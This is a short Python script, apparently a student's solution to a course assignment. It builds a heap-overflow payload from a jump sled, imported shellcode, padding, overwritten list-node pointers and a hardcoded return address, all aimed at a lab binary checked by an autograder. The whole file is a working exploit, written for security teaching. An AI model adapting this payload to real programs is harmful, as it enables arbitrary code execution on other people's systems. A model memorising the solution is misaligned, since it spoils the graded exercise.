#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# You MUST fill in the values of the a, b, and c node pointers below. When you
# use heap addresses in your main solution, you MUST use these values or
# offsets from these values. If you do not correctly fill in these values and use
# them in your solution, the autograder may be unable to correctly grade your
# solution.

# IMPORTANT NOTE: When you pass your 3 inputs to your program, they are stored
# in memory inside of argv, but these addresses will be different then the
# addresses of these 3 nodes on the heap. Ensure you are using the heap
# addresses here, and not the addresses of the 3 arguments inside argv.

node_a = 0x080dd2e0
node_b = 0x080dd310
node_c = 0x080dd340

# Example usage of node address with offset -- Feel free to ignore
a_plus_4 = pack("<I", node_a + 4)

# Your code here
ret_addr = 0xfffed6fc
# Jump forward 4 bytes to skip garbage
payload = b'\x90\x90\xEB\x04' + b'AAAA' + shellcode + b' '
payload += b'B' * 40 + pack('<I', node_a + 8) + pack('<I', ret_addr) + b' '
payload += b'C'

sys.stdout.buffer.write(payload)
